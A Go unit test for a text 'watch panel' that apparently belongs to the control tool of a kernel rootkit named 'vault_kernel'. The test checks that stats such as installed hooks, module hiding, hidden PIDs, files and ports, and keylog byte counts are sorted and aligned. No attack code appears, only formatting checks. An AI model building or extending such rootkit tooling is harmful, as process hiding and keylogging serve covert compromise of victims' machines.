package ioctl

import (
	"strings"
	"testing"
)

// The watch panel layout is a user-facing contract: keys sorted,
// column-aligned values, "(none)" for empty hidden sections and a
// "(no stats)" placeholder when the module returned nothing.
func TestRenderWatchPanelFull(t *testing.T) {
	stats := map[string]string{
		"module":          "vault_kernel",
		"version":         "3.7",
		"hooks_installed": "7",
		"hooks_planned":   "7",
		"module_hidden":   "0",
		"hidden_files":    "1",
		"hidden_pids":     "1",
		"hidden_ports":    "1",
		"keylog_bytes":    "0",
		"uptime_s":        "42",
	}
	hl := HiddenList{
		PIDs:  []int{1234, 567},
		Files: []string{"secret.txt", "my dir/with space.txt"},
		Ports: []int{8080},
	}
	got := RenderWatchPanel(stats, hl, 1000, "01:42:10")

	if !strings.Contains(got, "vault_kernel watch — refresh 1000 ms — updated 01:42:10 — Ctrl-C to stop") {
		t.Errorf("header missing/incorrect:\n%s", got)
	}
	if !strings.Contains(got, "== stats ==") || !strings.Contains(got, "== hidden ==") {
		t.Errorf("section titles missing:\n%s", got)
	}
	// Keys sorted alphabetically: hooks_installed before hooks_planned,
	// module_hidden before module... check a couple of relative orders.
	if i1, i2 := strings.Index(got, "hooks_installed"), strings.Index(got, "hooks_planned"); i1 > i2 {
		t.Errorf("stats keys not sorted (hooks_installed after hooks_planned):\n%s", got)
	}
	// Column alignment: the widest key ("hooks_installed", 15) defines
	// the pad width, then the format adds " : " — so "version" is
	// followed by 9 spaces before the colon.
	if !strings.Contains(got, "version         : 3.7") {
		t.Errorf("version row missing/misaligned:\n%s", got)
	}
	if !strings.Contains(got, "pids : 1234, 567") {
		t.Errorf("pids row missing:\n%s", got)
	}
	if !strings.Contains(got, "files: secret.txt, my dir/with space.txt") {
		t.Errorf("files row missing (must keep verbatim names):\n%s", got)
	}
	if !strings.Contains(got, "ports: 8080") {
		t.Errorf("ports row missing:\n%s", got)
	}
}

func TestRenderWatchPanelEmptySections(t *testing.T) {
	hl := HiddenList{PIDs: []int{}, Files: []string{}, Ports: []int{}}
	got := RenderWatchPanel(map[string]string{}, hl, 500, "00:00:00")
	if !strings.Contains(got, "stats: (no stats)") {
		t.Errorf("empty stats placeholder missing:\n%s", got)
	}
	for _, want := range []string{"pids : (none)", "files: (none)", "ports: (none)"} {
		if !strings.Contains(got, want) {
			t.Errorf("empty section row %q missing:\n%s", want, got)
		}
	}
}
